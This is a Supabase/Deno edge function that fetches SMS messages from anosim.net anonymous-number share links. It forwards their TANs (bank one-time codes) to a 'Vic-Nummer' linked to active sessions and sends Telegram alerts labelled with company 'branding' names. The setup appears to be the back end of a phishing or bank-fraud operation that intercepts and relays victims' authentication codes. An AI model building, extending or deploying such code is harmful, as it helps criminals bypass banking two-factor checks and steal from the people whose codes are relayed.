import { createClient } from "npm:@supabase/supabase-js@2";
import { forwardByPhoneIdentifier } from "../_shared/forwardTan.ts";
import { notifyIncomingSms } from "../_shared/notifyIncomingSms.ts";

const supabase = createClient(
  Deno.env.get("SUPABASE_URL")!,
  Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
  { auth: { persistSession: false } },
);

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    let { url } = await req.json();

    const lower = url?.toLowerCase() ?? "";
    if (!url || !(lower.includes("anosim.net/api/v1/orderbookingshare") || lower.includes("anosim.net/share/orderbooking"))) {
      return new Response(JSON.stringify({ error: "Invalid URL" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // Sessions store the URL as entered; remember it for forwarding lookup.
    const storedIdentifier = String(url);

    // Convert share URL to API URL
    url = url.replace("/share/orderbooking?", "/api/v1/orderbookingshare?");

    const res = await fetch(url);
    const data = await res.json();

    const smsList = Array.isArray(data?.sms) ? data.sms : [];
    const messages = smsList.map((m: any) => ({
      sender: m?.messageSender ?? m?.sender ?? "Unbekannt",
      date: m?.messageDate ?? m?.date ?? new Date().toISOString(),
      text: m?.messageText ?? m?.text ?? "",
    }));
    const apiIdentifier = storedIdentifier.replace("/share/orderbooking?", "/api/v1/orderbookingshare?");

    // TAN-Weiterleitung an die Vic-Nummer (nur aktive Sessions, idempotent)
    if (messages.length > 0) {
      try {
        const r = await forwardByPhoneIdentifier(storedIdentifier, messages);
        if (r.checked === 0 && r.reason === "no_active_session" && apiIdentifier !== storedIdentifier) {
          await forwardByPhoneIdentifier(apiIdentifier, messages);
        }
      } catch (e) {
        console.error("forwardByPhoneIdentifier failed:", e);
      }

      // Telegram "Neue SMS empfangen" — direkt beim Abruf, ohne Wächter
      try {
        const phoneNumber: string = data?.number ?? "";
        // Branding + Name aus phone_numbers ermitteln (beide URL-Formen prüfen)
        const { data: pn } = await supabase
          .from("phone_numbers")
          .select("branding_id")
          .in("api_url", [storedIdentifier, apiIdentifier])
          .limit(1)
          .maybeSingle();
        let brandingId: string | null = (pn?.branding_id as string) ?? null;
        let brandingName: string | null = null;
        if (brandingId) {
          const { data: b } = await supabase
            .from("brandings")
            .select("company_name")
            .eq("id", brandingId)
            .maybeSingle();
          brandingName = (b?.company_name as string) ?? null;
        }
        await notifyIncomingSms({
          provider: "anosim",
          sourceKey: apiIdentifier,
          identifier: apiIdentifier,
          phoneNumber,
          brandingId,
          brandingName,
          messages,
        });
      } catch (e) {
        console.error("notifyIncomingSms (anosim) failed:", e);
      }
    }

    return new Response(JSON.stringify(data), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: String(err) }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
